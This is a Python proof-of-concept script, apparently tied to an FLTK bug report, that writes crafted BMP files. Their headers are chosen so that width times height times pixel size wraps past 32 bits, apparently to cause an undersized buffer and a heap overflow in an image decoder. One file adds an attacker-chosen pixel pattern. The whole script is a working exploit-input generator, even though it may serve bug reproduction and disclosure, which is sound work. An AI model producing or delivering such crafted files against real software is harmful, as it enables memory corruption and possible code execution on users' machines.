#!/usr/bin/env python3
"""Generate the 118-byte BMP shapes from FLTK issue #1647 (gross geometry)."""
import struct
import sys

SHAPES = {
    "poc-alloc": (2, 715827883, 24),   # 2*715827883*3 == 2**32 + 2
    "poc-b":     (6, 238609295, 24),
    "poc-c":     (4, 268435457, 32),
    "safe":      (2, 8, 24),
}

def header(width, height, depth, pixels):
    off = 54
    hdr  = b"BM" + struct.pack("<I", off + len(pixels)) + b"\x00\x00\x00\x00"
    hdr += struct.pack("<I", off)
    hdr += struct.pack("<I", 40) + struct.pack("<i", width) + struct.pack("<i", height)
    hdr += struct.pack("<H", 1) + struct.pack("<H", depth) + struct.pack("<I", 0)
    hdr += struct.pack("<I", len(pixels)) + struct.pack("<i", 0) + struct.pack("<i", 0)
    hdr += struct.pack("<I", 0) + struct.pack("<I", 0)
    assert len(hdr) == 54
    return hdr

def make(path, width, height, depth):
    pixels = b"\x41" * 64
    with open(path, "wb") as f:
        f.write(header(width, height, depth, pixels) + pixels)
    print("%s bytes=%d w=%d h=%d depth=%d nominal=%d wrapped32=%d" % (
        path, 54 + len(pixels), width, height, depth,
        width * height * (depth // 8),
        ((width * height * (depth // 8) + 2**31) % 2**32) - 2**31))

def make_chosen(path, width, height, depth, pattern):
    pixels = (pattern * ((64 // len(pattern)) + 1))[:64]
    with open(path, "wb") as f:
        f.write(header(width, height, depth, pixels) + pixels)
    print("%s bytes=%d pattern=%r" % (path, 54 + len(pixels), pixels[:18]))

if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "."
    for name, (w, h, d) in SHAPES.items():
        make(out + "/" + name + ".bmp", w, h, d)
    make_chosen(out + "/poc-chosen.bmp", 2, 715827883, 24, b"MISHE-OO-TAUFTAUF")
